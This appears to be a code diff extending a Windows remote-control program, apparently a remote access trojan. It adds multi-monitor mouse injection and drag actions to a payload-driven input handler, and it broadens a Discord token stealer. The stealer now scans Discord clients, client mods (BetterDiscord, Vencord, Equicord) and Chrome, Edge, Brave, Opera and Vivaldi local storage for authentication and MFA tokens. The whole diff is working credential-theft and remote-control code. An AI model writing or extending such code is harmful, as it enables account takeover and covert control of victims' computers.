@@ -665,9 +665,11 @@ std::string handleMouse(const std::string& payload) {
     std::string ds=extractJson(payload,"delta");
     if(xs.empty()||ys.empty()||action.empty()) return "bad_payload";
     int x=std::stoi(xs); int y=std::stoi(ys);
-    int sw=GetSystemMetrics(SM_CXSCREEN); int sh=GetSystemMetrics(SM_CYSCREEN);
+    ScreenRect sr=getScreenRect(g_liveMonitor);
+    int sw=sr.w; int sh=sr.h; int sx=sr.x; int sy=sr.y;
+    auto toAbs=[&](int px,int py){INPUT in={0};in.type=INPUT_MOUSE;in.mi.dx=((px-sx)*65535)/sw;in.mi.dy=((py-sy)*65535)/sh;in.mi.dwFlags=MOUSEEVENTF_ABSOLUTE|MOUSEEVENTF_MOVE;return in;};
     INPUT in={0};in.type=INPUT_MOUSE;
-    in.mi.dx=(x*65535)/sw; in.mi.dy=(y*65535)/sh; in.mi.dwFlags=MOUSEEVENTF_ABSOLUTE;
+    in.mi.dx=((x-sx)*65535)/sw; in.mi.dy=((y-sy)*65535)/sh; in.mi.dwFlags=MOUSEEVENTF_ABSOLUTE;
     if(action=="move") in.mi.dwFlags|=MOUSEEVENTF_MOVE;
     else if(action=="down") in.mi.dwFlags|=MOUSEEVENTF_LEFTDOWN;
     else if(action=="up") in.mi.dwFlags|=MOUSEEVENTF_LEFTUP;
@@ -675,14 +677,28 @@ std::string handleMouse(const std::string& payload) {
     else if(action=="right_up") in.mi.dwFlags|=MOUSEEVENTF_RIGHTUP;
     else if(action=="middle_down") in.mi.dwFlags|=MOUSEEVENTF_MIDDLEDOWN;
     else if(action=="middle_up") in.mi.dwFlags|=MOUSEEVENTF_MIDDLEUP;
-    else if(action=="double") { in.mi.dwFlags|=MOUSEEVENTF_LEFTDOWN; SendInput(1,&in,sizeof(in)); in.mi.dwFlags=MOUSEEVENTF_ABSOLUTE|MOUSEEVENTF_LEFTUP; SendInput(1,&in,sizeof(in)); in.mi.dwFlags=MOUSEEVENTF_ABSOLUTE|MOUSEEVENTF_LEFTDOWN; SendInput(1,&in,sizeof(in)); in.mi.dwFlags=MOUSEEVENTF_ABSOLUTE|MOUSEEVENTF_LEFTUP; SendInput(1,&in,sizeof(in)); return "ok"; }
+    else if(action=="double") {
+        INPUT d1={0};d1.type=INPUT_MOUSE;d1.mi.dx=((x-sx)*65535)/sw;d1.mi.dy=((y-sy)*65535)/sh;d1.mi.dwFlags=MOUSEEVENTF_ABSOLUTE|MOUSEEVENTF_LEFTDOWN;
+        INPUT u1={0};u1.type=INPUT_MOUSE;u1.mi.dwFlags=MOUSEEVENTF_ABSOLUTE|MOUSEEVENTF_LEFTUP;
+        SendInput(1,&d1,sizeof(d1));Sleep(10);SendInput(1,&u1,sizeof(u1));Sleep(10);
+        SendInput(1,&d1,sizeof(d1));Sleep(10);SendInput(1,&u1,sizeof(u1));
+        return "ok";
+    }
     else if(action=="scroll") { int d=0;try{d=std::stoi(ds);}catch(...){d=120;} in.mi.dwFlags=MOUSEEVENTF_WHEEL; in.mi.mouseData=d; SendInput(1,&in,sizeof(in)); return "ok"; }
     else if(action=="drag") {
-        INPUT mv={0};mv.type=INPUT_MOUSE;mv.mi.dx=(x*65535)/sw;mv.mi.dy=(y*65535)/sh;mv.mi.dwFlags=MOUSEEVENTF_ABSOLUTE|MOUSEEVENTF_MOVE;
-        INPUT dn={0};dn.type=INPUT_MOUSE;dn.mi.dwFlags=MOUSEEVENTF_ABSOLUTE|MOUSEEVENTF_LEFTDOWN;
+        INPUT dn={0};dn.type=INPUT_MOUSE;dn.mi.dx=((x-sx)*65535)/sw;dn.mi.dy=((y-sy)*65535)/sh;dn.mi.dwFlags=MOUSEEVENTF_ABSOLUTE|MOUSEEVENTF_LEFTDOWN;
         SendInput(1,&dn,sizeof(dn));
-        for(int i=0;i<5;i++){Sleep(5);SendInput(1,&mv,sizeof(mv));}
         return "ok_dragging";
+    }
+    else if(action=="dragto") {
+        INPUT mv=toAbs(x,y);
+        SendInput(1,&mv,sizeof(mv));
+        return "ok_moved";
+    }
+    else if(action=="release") {
+        INPUT rel={0};rel.type=INPUT_MOUSE;rel.mi.dwFlags=MOUSEEVENTF_LEFTUP;
+        SendInput(1,&rel,sizeof(rel));
+        return "ok_released";
     }
     else return "bad_action";
     SendInput(1,&in,sizeof(in));
@@ -845,21 +861,15 @@ std::string getInstalledApps() {
 
 std::string getDiscordTokens() {
     std::string out;
-    const char* clients[] = {"discord","discordptb","discordcanary","discorddevelopment"};
-    char ad[MAX_PATH];
-    DWORD adLen = GetEnvironmentVariableA("APPDATA", ad, MAX_PATH);
-    if (adLen == 0 || adLen > MAX_PATH) return "Error: no AppData";
-    std::string basePath(ad);
     auto isTC = [](char c){return (c>='a'&&c<='z')||(c>='A'&&c<='Z')||(c>='0'&&c<='9')||c=='_'||c=='-';};
-    for (const char* cl : clients) {
-        std::string dir = basePath + "\\" + cl + "\\Local Storage\\leveldb\\";
-        std::string found;
+    auto scanLevelDB = [&](const std::string& dir, const std::string& label)->bool{
+        bool foundAny=false;
         for (const char* ext : {".ldb", ".log"}) {
             WIN32_FIND_DATAA fd;
             HANDLE hf = FindFirstFileA((dir + "*" + ext).c_str(), &fd);
             if (hf == INVALID_HANDLE_VALUE) continue;
             do {
-                HANDLE f = CreateFileA((dir + fd.cFileName).c_str(), GENERIC_READ, FILE_SHARE_READ|FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
+                HANDLE f = CreateFileA((dir + fd.cFileName).c_str(), GENERIC_READ, FILE_SHARE_READ|FILE_SHARE_WRITE|FILE_SHARE_DELETE, 0, OPEN_EXISTING, 0, 0);
                 if (f == INVALID_HANDLE_VALUE) continue;
                 DWORD sz = GetFileSize(f, 0);
                 if (sz > 0 && sz < 0xa00000) {
@@ -867,19 +877,17 @@ std::string getDiscordTokens() {
                     DWORD rd = 0;
                     if (ReadFile(f, buf.data(), sz, &rd, 0) && rd > 0) {
                         std::string s(buf.data(), rd);
-                        // MFA tokens: mfa.XXXX
                         size_t p = 0;
                         while ((p = s.find("mfa.", p)) != std::string::npos) {
                             size_t e = p + 4;
                             while (e < s.size() && isTC(s[e])) e++;
                             std::string t = s.substr(p, e - p);
-                            if (t.size() > 70 && found.find(t) == std::string::npos) {
-                                if (!found.empty()) found += "\n";
-                                found += t;
+                            if (t.size() > 70 && out.find(t) == std::string::npos) {
+                                if (!foundAny) { out += "[" + label + "]\n"; foundAny=true; }
+                                out += t + "\n";
                             }
                             p = e;
                         }
-                        // Regular tokens: XXX.XXX.XXX
                         for (size_t i = 0; i < s.size(); i++) {
                             if (!isTC(s[i])) continue;
                             size_t a = i;
@@ -898,9 +906,9 @@ std::string getDiscordTokens() {
                                     std::string s3 = s.substr(c, j - c);
                                     if (s3.size() >= 20 && s3.size() <= 32) {
                                         std::string t = s1 + "." + s2 + "." + s3;
-                                        if (found.find(t) == std::string::npos) {
-                                            if (!found.empty()) found += "\n";
-                                            found += t;
+                                        if (out.find(t) == std::string::npos) {
+                                            if (!foundAny) { out += "[" + label + "]\n"; foundAny=true; }
+                                            out += t + "\n";
                                         }
                                     }
                                 }
@@ -912,8 +920,100 @@ std::string getDiscordTokens() {
             } while (FindNextFileA(hf, &fd));
             FindClose(hf);
         }
-        if (!found.empty())
-            out += "[" + std::string(cl) + "]\n" + found + "\n\n";
+        return foundAny;
+    };
+    char ad[MAX_PATH], la[MAX_PATH];
+    DWORD adLen = GetEnvironmentVariableA("APPDATA", ad, MAX_PATH);
+    DWORD laLen = GetEnvironmentVariableA("LOCALAPPDATA", la, MAX_PATH);
+    const char* clients[] = {"discord","discordptb","discordcanary","discorddevelopment"};
+    if (adLen > 0 && adLen <= MAX_PATH) {
+        std::string basePath(ad);
+        for (const char* cl : clients) {
+            std::string dir = basePath + "\\" + cl + "\\Local Storage\\leveldb\\";
+            scanLevelDB(dir, cl);
+        }
+    }
+    if (laLen > 0 && laLen <= MAX_PATH) {
+        std::string laBase(la);
+        for (const char* cl : clients) {
+            std::string dir = laBase + "\\" + cl + "\\Local Storage\\leveldb\\";
+            scanLevelDB(dir, std::string(cl)+"(local)");
+        }
+    }
+    if (adLen > 0 && adLen <= MAX_PATH) {
+        std::string bdBase = std::string(ad) + "\\BetterDiscord\\storage\\leveldb\\";
+        scanLevelDB(bdBase, "BetterDiscord");
+        std::string vcBase = std::string(ad) + "\\Vencord\\storage\\leveldb\\";
+        scanLevelDB(vcBase, "Vencord");
+        std::string eqBase = std::string(ad) + "\\Equicord\\storage\\leveldb\\";
+        scanLevelDB(eqBase, "Equicord");
+    }
+    if (laLen > 0 && laLen <= MAX_PATH) {
+        std::string browsers[][2] = {
+            {std::string(la)+"\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\", "Chrome"},
+            {std::string(la)+"\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\", "Chrome-P1"},
+            {std::string(la)+"\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\", "Chrome-P2"},
+            {std::string(la)+"\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\", "Edge"},
+            {std::string(la)+"\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\", "Brave"},
+            {std::string(la)+"\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\", "Opera"},
+            {std::string(la)+"\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\", "Vivaldi"},
+        };
+        for (auto& b : browsers) {
+            WIN32_FIND_DATAA fd;
+            HANDLE hf = FindFirstFileA((b[0] + "*.ldb").c_str(), &fd);
+            if (hf == INVALID_HANDLE_VALUE) continue;
+            do {
+                HANDLE f = CreateFileA((b[0] + fd.cFileName).c_str(), GENERIC_READ, FILE_SHARE_READ|FILE_SHARE_WRITE|FILE_SHARE_DELETE, 0, OPEN_EXISTING, 0, 0);
+                if (f == INVALID_HANDLE_VALUE) continue;
+                DWORD sz = GetFileSize(f, 0);
+                if (sz > 0 && sz < 0xa00000) {
+                    std::vector<char> buf(sz);
+                    DWORD rd = 0;
+                    if (ReadFile(f, buf.data(), sz, &rd, 0) && rd > 0) {
+                        std::string s(buf.data(), rd);
+                        if (s.find("discord.com") != std::string::npos || s.find("discordapp.com") != std::string::npos) {
+                            size_t p = 0;
+                            while ((p = s.find("mfa.", p)) != std::string::npos) {
+                                size_t e = p + 4;
+                                while (e < s.size() && isTC(s[e])) e++;
+                                std::string t = s.substr(p, e - p);
+                                if (t.size() > 70 && out.find(t) == std::string::npos) {
+                                    out += "[" + b[1] + " web]\n" + t + "\n";
+                                }
+                                p = e;
+                            }
+                            for (size_t i = 0; i < s.size(); i++) {
+                                if (!isTC(s[i])) continue;
+                                size_t a = i;
+                                while (i < s.size() && isTC(s[i])) i++;
+                                std::string s1 = s.substr(a, i - a);
+                                if (s1.size() >= 18 && s1.size() <= 28 && i < s.size() && s[i] == '.') {
+                                    size_t j = i + 1;
+                                    if (j >= s.size()) break;
+                                    size_t b2 = j;
+                                    while (j < s.size() && isTC(s[j])) j++;
+                                    std::string s2 = s.substr(b2, j - b2);
+                                    if (s2.size() >= 4 && s2.size() <= 10 && j < s.size() && s[j] == '.') {
+                                        j++;
+                                        size_t c = j;
+                                        while (j < s.size() && isTC(s[j])) j++;
+                                        std::string s3 = s.substr(c, j - c);
+                                        if (s3.size() >= 20 && s3.size() <= 32) {
+                                            std::string t = s1 + "." + s2 + "." + s3;
+                                            if (out.find(t) == std::string::npos) {
+                                                out += "[" + b[1] + " web]\n" + t + "\n";
+                                            }
+                                        }
+                                    }
+                                }
+                            }
+                        }
+                    }
+                }
+                CloseHandle(f);
+            } while (FindNextFileA(hf, &fd));
+            FindClose(hf);
+        }
     }
     if (out.empty()) out = "No Discord tokens found";
     return out;
